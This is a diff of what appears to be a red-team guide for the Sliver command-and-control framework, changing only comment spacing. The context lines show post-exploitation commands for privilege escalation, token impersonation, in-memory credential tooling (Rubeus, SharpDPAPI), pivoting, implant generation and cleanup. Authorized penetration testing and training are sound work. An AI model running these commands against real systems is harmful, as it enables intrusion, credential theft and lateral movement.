@@ -199,7 +199,7 @@ sliver (SESSION) > whoami
 sliver (SESSION) > getprivs
 sliver (SESSION) > ls
 sliver (SESSION) > netstat
-sliver (SESSION) > ps -T            # show injected/protected processes
+sliver (SESSION) > ps -T # show injected/protected processes
 sliver (SESSION) > screenshot
 sliver (SESSION) > execute -o whoami /all
 ```
@@ -207,7 +207,7 @@ sliver (SESSION) > execute -o whoami /all
 Get a system shell or run a command without spawning a noisy cmd.exe:
 
 ```
-sliver (SESSION) > shell            # full interactive shell (noisy; use sparingly)
+sliver (SESSION) > shell # full interactive shell (noisy; use sparingly)
 sliver (SESSION) > execute -o ipconfig /all
 ```
 
@@ -217,7 +217,7 @@ sliver (SESSION) > execute -o ipconfig /all
 # Migrate into another process / impersonate
 sliver (SESSION) > migrate PID
 sliver (SESSION) > make-token -u DOMAIN\\user -p Password123
-sliver (SESSION) > getsystem        # attempt SYSTEM via service/named-pipe
+sliver (SESSION) > getsystem # attempt SYSTEM via service/named-pipe
 
 # Run .NET tooling in memory (after armory install, see Step 8)
 sliver (SESSION) > rubeus triage
@@ -229,8 +229,8 @@ sliver (SESSION) > seatbelt -group=system
 The armory installs BOFs and .NET assemblies for in-memory use:
 
 ```
-sliver > armory                     # list available packages
-sliver > armory install all         # or: armory install rubeus / sharpdpapi / etc.
+sliver > armory # list available packages
+sliver > armory install all # or: armory install rubeus / sharpdpapi / etc.
 sliver > armory update
 ```
 
@@ -238,7 +238,7 @@ Once installed, the alias/extension is available inside a session as a first-cla
 
 ```
 sliver (SESSION) > sharp-dpapi triage
-sliver (SESSION) > sa-whoami        # SA = situational awareness BOFs
+sliver (SESSION) > sa-whoami # SA = situational awareness BOFs
 sliver (SESSION) > inline-execute-assembly /opt/tools/Seatbelt.exe -group=all
 ```
 
@@ -256,7 +256,7 @@ sliver (SESSION) > portfwd add --bind 127.0.0.1:3389 --remote 10.0.5.20:3389
 # TCP pivot listener on the beachhead so deeper implants chain through it
 sliver (SESSION) > pivots tcp --bind 0.0.0.0:9898
 sliver > generate --tcp-pivot 10.0.5.10:9898 --os windows --format exe --save /tmp/
-sliver (SESSION) > pivots                # list active pivot graph
+sliver (SESSION) > pivots # list active pivot graph
 ```
 
 ### Step 10: Clean up
@@ -264,8 +264,8 @@ sliver (SESSION) > pivots                # list active pivot graph
 Remove implants, close sessions, and stop listeners at engagement end:
 
 ```
-sliver (SESSION) > kill              # terminate the implant cleanly
-sliver > jobs -k JOB_ID             # stop a specific listener
+sliver (SESSION) > kill # terminate the implant cleanly
+sliver > jobs -k JOB_ID # stop a specific listener
 sliver > implants rm IMPLANT_NAME
 ```
 
